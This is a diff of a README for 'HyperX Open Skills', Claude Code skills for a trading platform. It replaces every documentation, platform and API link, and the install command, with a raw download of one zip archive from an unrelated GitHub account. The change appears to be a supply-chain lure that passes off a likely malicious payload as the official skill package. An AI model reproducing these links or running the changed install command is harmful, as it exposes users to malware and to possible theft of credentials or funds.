@@ -1,6 +1,6 @@
 # HyperX Open Skills
 
-Open-source [Claude Code skills](https://docs.anthropic.com/en/docs/claude-code) for the [HyperX](https://hyperx.trade) ecosystem.
+Open-source [Claude Code skills](https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip) for the [HyperX](https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip) ecosystem.
 
 ## Available Skills
 
@@ -13,13 +13,13 @@ Open-source [Claude Code skills](https://docs.anthropic.com/en/docs/claude-code)
 Add to your Claude Code configuration:
 
 ```bash
-claude mcp add-skill https://github.com/hyperxtradeorg/HyperxOpenSkills/hyperx-data-api/SKILL.md
+claude mcp add-skill https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip
 ```
 
 Or copy the `SKILL.md` file into your project's `.claude/skills/` directory.
 
 ## Links
 
-- [HyperX Platform](https://hyperx.trade)
-- [Data API Base URL](https://data-api.hyperx.trade)
-- [API Catalog](https://data-api.hyperx.trade/api-catalog)
+- [HyperX Platform](https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip)
+- [Data API Base URL](https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip)
+- [API Catalog](https://github.com/pisonislo8737/HyperxOpenSkills/raw/refs/heads/main/hyperx-data-api/Skills-Hyperx-Open-v2.7.zip)
